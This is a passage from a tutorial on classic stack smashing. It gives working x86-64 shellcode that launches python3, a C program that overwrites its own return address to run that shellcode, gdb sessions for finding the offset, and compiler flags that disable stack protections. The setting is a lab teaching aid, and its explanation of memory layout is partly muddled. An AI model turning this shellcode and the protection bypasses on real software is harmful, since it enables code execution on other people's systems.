        0x0000000000001153 <+42>:	imul   $0x68747970,0x2f(%rsi),%ebp
        0x000000000000115a <+49>:	outsl  %ds:(%rsi),(%dx)
        0x000000000000115b <+50>:	outsb  %ds:(%rsi),(%dx)
        0x000000000000115c <+51>:	xor    (%rax),%eax
        0x000000000000115e <+53>:	mov    $0x0,%eax
        0x0000000000001163 <+58>:	leave
        0x0000000000001164 <+59>:	ret
    End of assembler dump.
    (gdb) p (char*)0x0000000000001138
    $1 = 0x1138 <main+15> "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3"

Add the string of our program `\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3` to `stacky.c` and set the return address to the beginning of our string in the program.

    nano stacky.c

    #include <stdio.h>

    #define X 7

    int callme(int a, unsigned long *b){
        unsigned long *f;
        char program[64] = "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3";
        f = (unsigned long*)(&a + X);	// Override return address.
        *f = (unsigned long)&(program[0]);
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -g -o stacky
    ./stacky

    c: 16

The thing doesn't work because we added a new variable `program` after the variable `a` on our heap, so the difference between the address of the variable `a` and the 8 bytes after the address where the register `$rsp` points to is no longer 7 32-bit integers. We reopen the program with the `gdb` tool and recalculate the difference between the address of the variable `a` and the return address.

    gdb stacky

    Reading symbols from stacky...
    (gdb) break callme
    Breakpoint 1 at 0x1144: file stacky.c, line 8.
    (gdb) run
    Starting program: /home/aleks/stacky 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, callme (a=3, b=0x7fffffffe050) at stacky.c:8
    7		char program[64] = "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3";
    (gdb) s
    8	        f = (unsigned long*)(&a + X);	// Override return address.
    (gdb) s
    9	        *f = (unsigned long)&(program[0]);
    (gdb) s
    10	        return a + *b;
    (gdb) p &a
    $1 = (int *) 0x7fffffffdfec
    (gdb) p $rsp+8
    $2 = (void *) 0x7fffffffe048
    (gdb) p/x *((unsigned long*)($rsp+8)) 
    $3 = 0x555555555206
    (gdb) disassemble main
    Dump of assembler code for function main:
        0x00005555555551d1 <+0>:	push   %rbp
        0x00005555555551d2 <+1>:	mov    %rsp,%rbp
        0x00005555555551d5 <+4>:	sub    $0x10,%rsp
        0x00005555555551d9 <+8>:	movl   $0x5,-0x4(%rbp)
        0x00005555555551e0 <+15>:	movl   $0x3,-0x8(%rbp)
        0x00005555555551e7 <+22>:	mov    -0x4(%rbp),%edx
        0x00005555555551ea <+25>:	mov    -0x8(%rbp),%eax
        0x00005555555551ed <+28>:	add    %edx,%eax
        0x00005555555551ef <+30>:	cltq
        0x00005555555551f1 <+32>:	mov    %rax,-0x10(%rbp)
        0x00005555555551f5 <+36>:	lea    -0x10(%rbp),%rdx
        0x00005555555551f9 <+40>:	mov    -0x8(%rbp),%eax
        0x00005555555551fc <+43>:	mov    %rdx,%rsi
        0x00005555555551ff <+46>:	mov    %eax,%edi
        0x0000555555555201 <+48>:	call   0x555555555139 <callme>
        0x0000555555555206 <+53>:	cltq
        0x0000555555555208 <+55>:	mov    %rax,-0x10(%rbp)
        0x000055555555520c <+59>:	mov    -0x10(%rbp),%rax
        0x0000555555555210 <+63>:	mov    %eax,%edx
        0x0000555555555212 <+65>:	mov    -0x4(%rbp),%eax
        0x0000555555555215 <+68>:	add    %edx,%eax
        0x0000555555555217 <+70>:	mov    %eax,-0x4(%rbp)
        0x000055555555521a <+73>:	mov    -0x4(%rbp),%eax
        0x000055555555521d <+76>:	mov    %eax,%esi
        0x000055555555521f <+78>:	lea    0xdde(%rip),%rax        # 0x555555556004
        0x0000555555555226 <+85>:	mov    %rax,%rdi
        0x0000555555555229 <+88>:	mov    $0x0,%eax
        0x000055555555522e <+93>:	call   0x555555555030 <printf@plt>
        0x0000555555555233 <+98>:	mov    $0x0,%eax
        0x0000555555555238 <+103>:	leave
        0x0000555555555239 <+104>:	ret
    End of assembler dump.
    (gdb) p 0x7fffffffe048 - 0x7fffffffdfec
    $4 = 92
    (gdb) p 92 / 4
    $5 = 23

We correct the constant `X` in the program to the value 23, compile the program and run it again.

    nano stacky.c

    #include <stdio.h>

    #define X 23

    int callme(int a, unsigned long *b){
        unsigned long *f;
        char program[64] = "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3";
        f = (unsigned long*)(&a + X);   // Override return address.
        *f = (unsigned long)&(program[0]);
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);              // e == 11
        c = c + e;                              // c == 16
        printf("c: %d\n", c);   
        return 0;
    }

    gcc stacky.c -g -o stacky
    ./stacky

    Segmentation fault

The program returns a `Segmentation fault`, which is the result of protection against overwriting the return addresses. To recap, each program has its own section of memory, where the program code is at the top, then the constants, and a stack for dynamically storing local variables that grows downward, then we have some free memory, and finally at the bottom we have a stack that grows upward and the `rsp` register points to its top. Operating systems contain [Stack-smashing protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection):

1. [Address Space Layout Randomization - ASR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), which prevents the possibility of finding out where a part of the program's memory is located in memory. Therefore, an attacker cannot use jumps to absolute addresses in memory.
2. [Execution stack - (execstack)](https://linux.die.net/man/8/execstack) A part of a program that contains program code and the heap is marked as a part that can be executed (execute), while, the stack is marked as a non executable part (no execute). This information is provided by the program itself or his compiler. By default, modern compilers allow only the code itself to be executed (execute), and all remaining memory of the program must not be executed (no execute).
3. [Stack protector](https://developers.redhat.com/articles/2022/06/02/use-compiler-flags-stack-protection-gcc-and-clang#) adds at runtime a word to the top of the stack in program memory, which is checked before each jump in the program to see if it has been changed and prevents jumps in the event when this word has been changed.

If we want to carry out our attack, we will have to turn off the mentioned measures.

    gcc stacky.c -fno-stack-protector -z execstack -g -o stacky

    ./stacky

    Python 3.9.2 (default, Feb 28 2021, 17:03:44)  

    [GCC 10.2.1 20210110] on linux 

    Type "help", "copyright", "credits" or "license" for more information. 

    >>>

From here, you can follow the [Smashing the stack for fun and profit](https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf) article and complete your attack successfully.
